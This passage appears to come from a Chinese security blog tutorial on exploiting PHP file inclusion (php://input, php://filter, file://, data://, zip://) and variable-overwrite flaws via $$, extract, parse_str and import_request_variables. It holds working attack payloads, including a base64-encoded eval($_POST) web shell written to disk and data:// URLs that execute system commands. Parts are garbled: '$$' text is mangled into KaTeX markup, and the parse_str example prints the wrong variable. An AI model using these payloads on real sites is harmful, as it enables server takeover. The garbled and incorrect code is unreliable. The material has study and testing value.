<pre><code>&lt;?php @include($_GET[&quot;file&quot;])?&gt;
</code></pre>
<p>②使用php://input，将执行代码通过在POST data中提交</p>
<pre><code>#post方式提交
&lt;?php 
echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));
?&gt;
</code></pre>
<p>执行成功会在当前目录下生成一句话shell，可直接连接<br>
<img src="https://zpdad26.github.io//post-images/1606800421038.png" alt="" loading="lazy"></p>
<h4 id="143phpinput协议直接写入shell">1.4.3php://input协议直接写入shell</h4>
<p>①含有php://input的代码漏洞文件：(条件：allow_url_include = on&amp;allow_url_fopen()=on&amp; PHP &gt;= 5.2.0)</p>
<pre><code>&lt;?php 
$data = file_get_contents('php://input'); 
eval($data); 
?&gt;
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://zpdad26.github.io//post-images/1606800485125.png" alt="" loading="lazy"></figure>
<h4 id="144-phpfilter读取源代码">1.4.4 php://filter读取源代码</h4>
<p>php://filter用于读取网站源码。读取php文件源码内容(直接包含脚本格式文件会解析无法直接获取文件源码)。用法：</p>
<pre><code>http://192.168.1.3/1.php?file=php://filter/read=convert.base64-encode/resource=1.php
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://zpdad26.github.io//post-images/1606800550406.png" alt="" loading="lazy"></figure>
<h4 id="145-file物理路径包含文件">1.4.5 file://物理路径包含文件</h4>
<p>file:// 协议在allow_url_fopen,allow_url_include都为off的情况下也可以正常使用：</p>
<pre><code>http://192.168.1.3/1.php?filename=file:///C:\\phpStudy\\WWW\\fileinclude\\2\\1.txt
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://zpdad26.github.io//post-images/1606800618230.png" alt="" loading="lazy"></figure>
<h4 id="146data利用文件包含data可进行命令执行">1.4.6data://：利用文件包含&amp;data://可进行命令执行</h4>
<pre><code>http://192.168.1.3/1.php?filename=data://text/plain,%3C?php%20system(%27whoami%27);?%3E
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://zpdad26.github.io//post-images/1606800674564.png" alt="" loading="lazy"></figure>
<h4 id="147zip绕过文件包含下的附加后缀">1.4.7zip://绕过文件包含下的附加后缀</h4>
<!-- more -->
<p>以下两串代码是对文件后缀进行验证或修改然后再进行包含。对于此类情况，如果要包含非预定文件后缀的文件，可以通过%00截断进行绕过。但是%00截断在php版本5.3.4之后就失效了，而且还要考虑GPC，限制比较严重。除此之外，可以通过zip协议和phar协议来包含文件，突破附加后缀限制。</p>
<pre><code># 验证包含对象文件后缀是否为jpg，如果是才进行包含
&lt;?php
$file = $_GET['file'];
if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){
	include($file);
}
?&gt;
</code></pre>
<pre><code>#直接为包含对象添加jpg后缀，然后进行包含
&lt;?php
$file = $_GET['file'];
include($file.'.jpg');
?&gt;
</code></pre>
<p>绕过方法：<br>
①实战情况下往目标站点上传zip文件，里面压缩着一个jpg格式的php脚本。<br>
<img src="https://zpdad26.github.io//post-images/1606800758310.png" alt="" loading="lazy"><br>
②构造zip://php.zip#php.jpg，进行zip://伪协议绕过后缀名限制。这里将压缩文件里面的内容修改为在当前目录下生成一句话即可getshell。<br>
<img src="https://zpdad26.github.io//post-images/1606800784843.png" alt="" loading="lazy"></p>
<!-- more -->
<h3 id="15变量覆盖漏洞">1.5变量覆盖漏洞</h3>
<h4 id="151-变量覆盖">1.5.1 $$变量覆盖</h4>
<p>变量即可变变量，将一个变量的值加上 $ 来作为 另一个变量的名字；</p>
<pre><code>  &lt;?php
    $x = &quot;hello&quot;;
    $$x = 666;
    echo $x;
    echo &quot;&lt;br&gt;&quot;;
    echo $$x;
    echo &quot;&lt;br&gt;&quot;;
    echo $$x === $hello;
?&gt;
</code></pre>
<p>x将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi>h</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi mathvariant="normal">拿</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">拼</mi><mi mathvariant="normal">接</mi><mi mathvariant="normal">上</mi></mrow><annotation encoding="application/x-tex">x的值hello拿来拼接上</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord cjk_fallback">拿</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">拼</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">上</span></span></span></span>变成了$hello,于是x === $hello<br>
<img src="https://zpdad26.github.io//post-images/1606800903783.png" alt="" loading="lazy"></p>
<h4 id="152-extract函数">1.5.2 extract（）函数</h4>
<p>extract(array,extract_rules,prefix)<br>
extract()函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中每个元素，将在当前符号表中创建一个对应的变量</p>
<pre><code>   &lt;?php
$a = 1;    //原变量值为1
$b = array('a' =&gt; '3');
extract($b);    //经过extract()函数对$b处理后
echo $a;    //输出结果为3
?&gt; 
</code></pre>
<h4 id="153-parse_str函数">1.5.3 parse_str()函数</h4>
<p>parse_str(string,array)**<br>
string必需。 规定要解析的字符串。array可选。 规定存储变量的数组名称。该参数指示变量存储到数组中<br>
如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p>
<pre><code> &lt;?php
$a = 1;                  //原变量值为1
parse_str('a=2');   //经过parse_str()函数后注册变量$a，重新赋值
print_r($b);          //输出结果为2
?&gt;
</code></pre>
<h4 id="154-import_request_variables函数">1.5.4 import_request_variables()函数</h4>
<p>bool import_request_variables(string<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi><mi>s</mi><mo>[</mo><mo separator="true">,</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">types[,string</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mopen">[</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span>prefix] )<br>
$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀</p>
<pre><code>&lt;?php
$auth='0';
import_request_variables('G');
if($auth== 1){
echo&quot;private!&quot;;
}else{
echo&quot;public!&quot;;
}
?&gt;
</code></pre>
<p>get auth=1时，网页上会输出private！<br>
import_request_variables(‘G’)指定导入GET请求中的变量，从而导致变量覆盖</p>
]]></content>
    </entry>
</feed>